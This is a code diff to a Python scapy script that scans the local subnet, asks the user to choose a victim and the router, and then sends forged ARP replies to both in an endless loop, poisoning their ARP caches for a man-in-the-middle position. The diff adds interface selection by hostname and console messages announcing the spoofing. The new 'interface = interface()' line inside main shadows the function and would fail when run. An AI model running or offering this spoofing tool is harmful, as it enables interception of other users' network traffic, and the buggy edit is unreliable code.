@@ -1,14 +1,16 @@
-# ========================================================================================================================================================================================================
-interface = 'wlp0s20f3'
-# ========================================================================================================================================================================================================
-# Don't touch after this line
-# ========================================================================================================================================================================================================
-
 from ipaddress import IPv4Network
 from scapy import all as scapy
 from socket import *
 from fcntl import ioctl
 from struct import pack
+import os
+
+def interface():
+    if os.uname()[1] == 'machine':
+        interface = 'enp0s8'
+    else:
+        interface = 'wlp0s20f3'
+    return interface
 
 def getNetworkMask(interface):
     s = socket(AF_INET, SOCK_DGRAM)
@@ -23,6 +25,7 @@ def makeARPRequest(ip):
     return answered, unanswered
 
 def main():
+    interface = interface()
     netmask = getNetworkMask(interface)
     address = IPv4Network(scapy.get_if_addr(interface) + '/' + netmask, False)
     ip = address.network_address
@@ -44,7 +47,9 @@ def main():
     print('Vous avez choisi : ' + routeur[0] + ' ' + routeur[1])
     while True:
         scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=routeur[0]), verbose=0)
+        print('Spoofing ' + cible[1] + ' to ' + routeur[1])
         scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=cible[0]), verbose=0)
+        print('Spoofing ' + routeur[1] + ' to ' + cible[1])
 
 if __name__ == '__main__':
     main()
